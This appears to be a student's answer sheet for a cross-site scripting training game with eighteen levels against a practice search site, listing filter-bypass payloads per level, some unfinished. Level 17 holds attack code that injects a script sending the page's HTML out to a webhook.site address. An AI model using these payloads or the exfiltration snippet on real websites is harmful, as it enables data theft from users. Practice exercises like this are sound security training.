# 0. Welcome

N/A

# 1. A Truly Disruptive Startup (3 points)

```
<script>success(1)</script>
```

# 2. No Script Allowed (3 points)

```
<SCRIPT><script>success("")</script><SCRIPT>
```

# 3. One More Time, Like You Mean It (3 points)

```
<script><input onfocus=java:success("") autofocus></script>
```

# 4. An Open-and-Shut Case (3 points)

```
<script><input onfocus=java:success("") autofocus></script>
```

# 5. Time to Mix Things Up (3 points)

```
<script><input onfocus=java:success("") autofocus></script>
```

# 6. A Picture is Worth a Thousand Words (3 points)

```
<input onfocus=java:success("") autofocus>
```


# 7. Between a Rock And a Hard Place (3 points)

```
<input onfocus=java:success("") autofocus>
```


# 8. Angle of Death (6 points)

```
<<div onclick=success("")>>salam</div>

```
TODO: Replace this with your attack input.
```

Server code:

```js
router.get('/search', async (req, res) => {
  let q = req.query.q
  if (q == null) q = ''

  // TODO: Replace this with your solution.
  // q = ???

  const results = await getResults(q)
  res.render('caloogle-search-page', { q, results })
})
```

# 9. All in a Day's Work

N/A

# 10. In the Wrong Place at the Wrong Time (3 points)

```
<iframe"<svg onload=success("")>">
```

# 11. You Can't Win 'em All (6 points)

Attack input:

```
TODO: <iframe""<svg onload=success()>"">
```

Server code:

```js
router.get('/search', async (req, res) => {
  let q = req.query.q
  if (q == null) q = ''

  // TODO: Replace this with your solution.
  // q = ???

  const results = await getResults(q)
  res.render('caloogle-search-page', { q, results })
})
```

# 12. When All is Said and Done (6 points)

Attack input:

```
TODO:  '><SCRIPT>success();</SCRIPT>
```

Server code:

```js
router.get('/search', async (req, res) => {
  let q = req.query.q
  if (q == null) q = ''

  // TODO: Replace this with your solution.
  // q = ???

  const results = await getResults(q)
  res.render('caloogle-search-page', { q, results })
})
```

# 13. When You Want a Job Done Right

N/A

# 14. Here Today and Gone Tomorrow (3 points)

Attack URL:

```
TODO: http://caloogle.xyz:4140/search?q=a&lang=en%22%20onload=success(1)
```

# 15. The Early Bird Catches the Worm (3 points)

```
TODO: </ScrIpt><script>success(1)</script>
```

# 16. Tying Up Loose Ends (3 points)

```
TODO: <<//ScrIpt><script>success(1)<<//SCript>
```

# 17. Take a Page Out of Their Book (6 points)

Attack code:

```js
// TODO:  
function send(payload) {
    fetch('/comment', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({text: 'http://google.com/', id: "1);success("})
    }).then((response) => response.clone().text())
    .then((data) => console.log(data));
}

send('<script> payload = document.documentElement.innerHTML; window.location="https://webhook.site/my-private-id?query=" + encodeURIComponent(payload); </script>')

```

# 18. Congrats

N/A

# Əlavə qeydlər

```
Əlavə qeydlərinizi yazın
```
